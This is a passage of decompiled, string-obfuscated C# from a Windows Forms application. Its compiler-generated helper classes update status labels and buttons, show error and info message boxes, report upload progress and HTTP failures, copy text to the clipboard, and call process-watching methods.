		// (set) Token: 0x0600067F RID: 1663 RVA: 0x00066414 File Offset: 0x00064614
		public IntPtr IntPtr_0 { get; private set; }

		// Token: 0x170002DE RID: 734
		// (get) Token: 0x06000680 RID: 1664 RVA: 0x00066428 File Offset: 0x00064628
		// (set) Token: 0x06000681 RID: 1665 RVA: 0x0006643C File Offset: 0x0006463C
		public IntPtr IntPtr_1 { get; private set; }

		// Token: 0x06000682 RID: 1666 RVA: 0x00066450 File Offset: 0x00064650
		public Class19(int int_1, TimeSpan timeSpan_1, IntPtr intptr_2, IntPtr intptr_3)
		{
			this.Int32_0 = int_1;
			this.TimeSpan_0 = timeSpan_1;
			this.IntPtr_0 = intptr_2;
			this.IntPtr_1 = intptr_3;
		}

		// Token: 0x04000970 RID: 2416
		[CompilerGenerated]
		private int int_0;

		// Token: 0x04000971 RID: 2417
		[CompilerGenerated]
		private TimeSpan timeSpan_0;

		// Token: 0x04000972 RID: 2418
		[CompilerGenerated]
		private IntPtr intptr_0;

		// Token: 0x04000973 RID: 2419
		[CompilerGenerated]
		private IntPtr intptr_1;
	}

	// Token: 0x020000BE RID: 190
	[CompilerGenerated]
	private sealed class Class20
	{
		// Token: 0x06000684 RID: 1668 RVA: 0x00066480 File Offset: 0x00064680
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray2<string>(1449086963U);
		}

		// Token: 0x06000685 RID: 1669 RVA: 0x000664A8 File Offset: 0x000646A8
		internal void method_1()
		{
			this.gform0_0.check_pid_main_stopwatch(this.process_0);
		}

		// Token: 0x06000686 RID: 1670 RVA: 0x000664C8 File Offset: 0x000646C8
		internal void method_2()
		{
			this.gform0_0.getprocess(this.process_0);
		}

		// Token: 0x06000687 RID: 1671 RVA: 0x000664E8 File Offset: 0x000646E8
		internal void method_3()
		{
			this.gform0_0.flag_process_stop_watch(this.process_0);
		}

		// Token: 0x04000974 RID: 2420
		public MAIN gform0_0;

		// Token: 0x04000975 RID: 2421
		public Process process_0;
	}

	// Token: 0x020000BF RID: 191
	[CompilerGenerated]
	private sealed class Class21
	{
		// Token: 0x06000689 RID: 1673 RVA: 0x00066508 File Offset: 0x00064708
		internal void method_0()
		{
			MessageBox.Show(this.gform0_0, this.string_0, <Module>.DeserializeFromByteArray3<string>(67513759U), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x04000976 RID: 2422
		public string string_0;

		// Token: 0x04000977 RID: 2423
		public MAIN gform0_0;
	}

	// Token: 0x020000C0 RID: 192
	[CompilerGenerated]
	private sealed class Class22
	{
		// Token: 0x0600068B RID: 1675 RVA: 0x00066534 File Offset: 0x00064734
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray3<string>(2668601672U) + this.string_0;
			this.gform0_0.button_0.Enabled = false;
		}

		// Token: 0x04000978 RID: 2424
		public string string_0;

		// Token: 0x04000979 RID: 2425
		public MAIN gform0_0;
	}

	// Token: 0x020000C1 RID: 193
	[CompilerGenerated]
	private sealed class Class23
	{
		// Token: 0x0600068D RID: 1677 RVA: 0x00066578 File Offset: 0x00064778
		internal void method_0()
		{
			MessageBox.Show(this.class22_0.gform0_0, this.string_0, <Module>.DeserealizeFromByteArrayV2_1<string>(964320615U) + this.class22_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0400097A RID: 2426
		public string string_0;

		// Token: 0x0400097B RID: 2427
		public MAIN.Class22 class22_0;
	}

	// Token: 0x020000C2 RID: 194
	[CompilerGenerated]
	private sealed class Class24
	{
		// Token: 0x0400097C RID: 2428
		public string string_0;

		// Token: 0x0400097D RID: 2429
		public MAIN gform0_0;
	}

	// Token: 0x020000C3 RID: 195
	[CompilerGenerated]
	private sealed class Class25
	{
		// Token: 0x06000690 RID: 1680 RVA: 0x000665BC File Offset: 0x000647BC
		internal void method_0()
		{
			MessageBox.Show(this.class24_0.gform0_0, this.string_0, <Module>.DeserializeFromByteArray2<string>(1046146674U) + this.class24_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0400097E RID: 2430
		public string string_0;

		// Token: 0x0400097F RID: 2431
		public MAIN.Class24 class24_0;
	}

	// Token: 0x020000C4 RID: 196
	[CompilerGenerated]
	private sealed class Class26
	{
		// Token: 0x06000692 RID: 1682 RVA: 0x00066600 File Offset: 0x00064800
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray3<string>(3011183741U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray<string>(3062645655U) + this.string_0, <Module>.DeserealizeFromByteArrayV2_1<string>(242730259U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000980 RID: 2432
		public string string_0;

		// Token: 0x04000981 RID: 2433
		public MAIN gform0_0;
	}

	// Token: 0x020000C5 RID: 197
	[CompilerGenerated]
	private sealed class Class27
	{
		// Token: 0x06000694 RID: 1684 RVA: 0x00066674 File Offset: 0x00064874
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray<string>(3482699585U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray3<string>(613109258U) + this.string_0, <Module>.DeserializeFromByteArray<string>(3456363529U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000982 RID: 2434
		public string string_0;

		// Token: 0x04000983 RID: 2435
		public MAIN gform0_0;
	}

	// Token: 0x020000C6 RID: 198
	[CompilerGenerated]
	private sealed class Class28
	{
		// Token: 0x06000696 RID: 1686 RVA: 0x000666E8 File Offset: 0x000648E8
		internal void method_0()
		{
			this.class27_0.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray3<string>(3011183741U);
			this.class27_0.gform0_0.button_0.Enabled = true;
			string text = string.Empty;
			if (this.httpWebResponse_0 == null)
			{
				text = <Module>.DeserializeFromByteArrayV2<string>(1477590003U) + this.class27_0.string_0;
			}
			else
			{
				text = string.Format(<Module>.DeserealizeFromByteArrayV2_1<string>(747745260U), (int)this.httpWebResponse_0.StatusCode, this.httpWebResponse_0.StatusDescription, this.class27_0.string_0);
			}
			MessageBox.Show(this.class27_0.gform0_0, text, <Module>.DeserializeFromByteArray2<string>(1046146674U) + this.class27_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000984 RID: 2436
		public HttpWebResponse httpWebResponse_0;

		// Token: 0x04000985 RID: 2437
		public MAIN.Class27 class27_0;
	}

	// Token: 0x020000C7 RID: 199
	[CompilerGenerated]
	private sealed class Class29
	{
		// Token: 0x06000698 RID: 1688 RVA: 0x000667BC File Offset: 0x000649BC
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray2<string>(2612115869U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserealizeFromByteArrayV2_1<string>(2302173881U) + this.string_0, <Module>.DeserializeFromByteArray3<string>(410095828U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000986 RID: 2438
		public string string_0;

		// Token: 0x04000987 RID: 2439
		public MAIN gform0_0;
	}

	// Token: 0x020000C8 RID: 200
	[CompilerGenerated]
	private sealed class Class30
	{
		// Token: 0x0600069A RID: 1690 RVA: 0x00066830 File Offset: 0x00064A30
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(3996504788U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray2<string>(2944668011U) + this.string_0, <Module>.DeserealizeFromByteArrayV2_1<string>(242730259U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000988 RID: 2440
		public string string_0;

		// Token: 0x04000989 RID: 2441
		public MAIN gform0_0;
	}

	// Token: 0x020000C9 RID: 201
	[CompilerGenerated]
	private sealed class Class31
	{
		// Token: 0x0600069C RID: 1692
		internal void UpdateFormAndShowMessage()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray3<string>(1215797643U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray<string>(855719087U) + this.string_0, <Module>.DeserializeFromByteArray3<string>(410095828U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0400098A RID: 2442
		public string string_0;

		// Token: 0x0400098B RID: 2443
		public MAIN gform0_0;
	}

	// Token: 0x020000CA RID: 202
	[CompilerGenerated]
	private sealed class Class32
	{
		// Token: 0x0600069E RID: 1694 RVA: 0x00066918 File Offset: 0x00064B18
		internal void method_0()
		{
			int num = this.uploadProgressChangedEventArgs_0.ProgressPercentage;
			if (num > 100)
			{
				num = 100;
			}
			this.gform0_0.label_3.Text = string.Format(<Module>.DeserializeFromByteArray<string>(3425513601U), num);
		}

		// Token: 0x0400098C RID: 2444
		public UploadProgressChangedEventArgs uploadProgressChangedEventArgs_0;

		// Token: 0x0400098D RID: 2445
		public MAIN gform0_0;
	}

	// Token: 0x020000CB RID: 203
	[CompilerGenerated]
	private sealed class Class33
	{
		// Token: 0x060006A0 RID: 1696 RVA: 0x00066960 File Offset: 0x00064B60
		internal void method_0()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray3<string>(1215797643U);
			this.gform0_0.button_0.Enabled = true;
			this.gform0_0.button_0.Text = <Module>.DeserializeFromByteArray3<string>(2484619204U);
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray3<string>(3341086753U) + this.string_0, <Module>.DeserealizeFromByteArrayV2_1<string>(242730259U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x060006A1 RID: 1697 RVA: 0x000669EC File Offset: 0x00064BEC
		internal void method_1()
		{
			this.gform0_0.label_3.Text = <Module>.DeserealizeFromByteArrayV2_1<string>(1540088222U);
			this.gform0_0.button_0.Enabled = false;
		}

		// Token: 0x060006A2 RID: 1698 RVA: 0x00066A24 File Offset: 0x00064C24
		internal void method_2()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray<string>(368885911U);
			this.gform0_0.button_0.Enabled = false;
		}

		// Token: 0x060006A3 RID: 1699 RVA: 0x00066A5C File Offset: 0x00064C5C
		internal void method_3()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(4141109108U);
			this.gform0_0.button_0.Enabled = false;
		}

		// Token: 0x060006A4 RID: 1700 RVA: 0x00066A94 File Offset: 0x00064C94
		internal void method_4()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(4141109108U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray3<string>(1063549947U) + this.string_0, <Module>.DeserializeFromByteArrayV2<string>(433292899U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x060006A5 RID: 1701 RVA: 0x00066B08 File Offset: 0x00064D08
		internal void method_5()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(4141109108U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserializeFromByteArray3<string>(3341086753U) + this.string_0, <Module>.DeserializeFromByteArray3<string>(410095828U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x060006A6 RID: 1702 RVA: 0x00066B7C File Offset: 0x00064D7C
		internal void method_6()
		{
			this.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray2<string>(2612115869U);
			this.gform0_0.button_0.Enabled = true;
			MessageBox.Show(this.gform0_0, <Module>.DeserealizeFromByteArrayV2_1<string>(831941718U) + this.string_0, <Module>.DeserializeFromByteArrayV2<string>(433292899U) + this.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0400098E RID: 2446
		public MAIN gform0_0;

		// Token: 0x0400098F RID: 2447
		public string string_0;

		// Token: 0x04000990 RID: 2448
		public UploadValuesCompletedEventArgs uploadValuesCompletedEventArgs_0;
	}

	// Token: 0x020000CC RID: 204
	[CompilerGenerated]
	private sealed class Class34
	{
		// Token: 0x04000991 RID: 2449
		public string string_0;

		// Token: 0x04000992 RID: 2450
		public MAIN.Class33 class33_0;
	}

	// Token: 0x020000CD RID: 205
	[CompilerGenerated]
	private sealed class Class35
	{
		// Token: 0x060006A9 RID: 1705 RVA: 0x00066BF0 File Offset: 0x00064DF0
		internal void method_0()
		{
			this.class34_0.class33_0.gform0_0.label_3.Text = <Module>.DeserializeFromByteArray2<string>(1912938361U);
			this.class34_0.class33_0.gform0_0.button_0.Enabled = true;
			this.class34_0.class33_0.gform0_0.button_0.Text = <Module>.DeserializeFromByteArray3<string>(2484619204U);
			Clipboard.SetText(this.class34_0.string_0);
			MessageBox.Show(this.class34_0.class33_0.gform0_0, this.string_0, <Module>.DeserializeFromByteArray3<string>(2738398368U) + this.class34_0.class33_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x04000993 RID: 2451
		public string string_0;

		// Token: 0x04000994 RID: 2452
		public MAIN.Class34 class34_0;
	}

	// Token: 0x020000CE RID: 206
	[CompilerGenerated]
	private sealed class Class36
	{
		// Token: 0x060006AB RID: 1707 RVA: 0x00066CB0 File Offset: 0x00064EB0
		internal void method_0()
		{
			MessageBox.Show(this.class33_0.gform0_0, this.string_0, <Module>.DeserializeFromByteArray2<string>(392761127U) + this.class33_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x04000995 RID: 2453
		public string string_0;

		// Token: 0x04000996 RID: 2454
		public MAIN.Class33 class33_0;
	}

	// Token: 0x020000CF RID: 207
	[CompilerGenerated]
	private sealed class Class37
	{
		// Token: 0x060006AD RID: 1709 RVA: 0x00066CF4 File Offset: 0x00064EF4
		internal void method_0()
		{
			MessageBox.Show(this.class33_0.gform0_0, this.string_0, <Module>.DeserealizeFromByteArrayV2_1<string>(964320615U) + this.class33_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000997 RID: 2455
		public string string_0;

		// Token: 0x04000998 RID: 2456
		public MAIN.Class33 class33_0;
	}

	// Token: 0x020000D0 RID: 208
	[CompilerGenerated]
	private sealed class Class38
	{
		// Token: 0x060006AF RID: 1711 RVA: 0x00066D38 File Offset: 0x00064F38
		internal void method_0()
		{
			MessageBox.Show(this.class33_0.gform0_0, this.string_0, <Module>.DeserializeFromByteArray3<string>(410095828U) + this.class33_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000999 RID: 2457
		public string string_0;

		// Token: 0x0400099A RID: 2458
		public MAIN.Class33 class33_0;
	}

	// Token: 0x020000D1 RID: 209
	[CompilerGenerated]
	private sealed class Class39
	{
		// Token: 0x060006B1 RID: 1713 RVA: 0x00066D7C File Offset: 0x00064F7C
		internal void method_0()
		{
			this.class33_0.gform0_0.label_3.Text = <Module>.DeserializeFromByteArrayV2<string>(4141109108U);
			this.class33_0.gform0_0.button_0.Enabled = true;
			string text = string.Empty;
			if (this.httpWebResponse_0 == null)
			{
				if (!this.class33_0.uploadValuesCompletedEventArgs_0.Cancelled && !(this.class33_0.uploadValuesCompletedEventArgs_0.Error.ToString() == <Module>.DeserializeFromByteArrayV2<string>(205863268U)))
				{
					if (Class12.Boolean_0 && this.class33_0.uploadValuesCompletedEventArgs_0.Error.InnerException != null && (this.class33_0.uploadValuesCompletedEventArgs_0.Error.InnerException is AuthenticationException || this.class33_0.uploadValuesCompletedEventArgs_0.Error.InnerException is IOException))
					{
						text = <Module>.DeserealizeFromByteArrayV2_1<string>(4267019298U) + Class12.smethod_1(false) + <Module>.DeserealizeFromByteArrayV2_1<string>(1791729658U);
					}
					else
					{
						text = <Module>.DeserializeFromByteArray2<string>(3341531673U);
					}
				}
				else
				{
					text = <Module>.DeserializeFromByteArray<string>(1754234796U);
				}
			}
			else
			{
				text = string.Format(<Module>.DeserializeFromByteArrayV2<string>(985418239U), (int)this.httpWebResponse_0.StatusCode, this.httpWebResponse_0.StatusDescription, this.class33_0.string_0);
			}
			MessageBox.Show(this.class33_0.gform0_0, text, <Module>.DeserializeFromByteArray3<string>(410095828U) + this.class33_0.string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0400099B RID: 2459
		public HttpWebResponse httpWebResponse_0;

		// Token: 0x0400099C RID: 2460
		public MAIN.Class33 class33_0;
	}
}
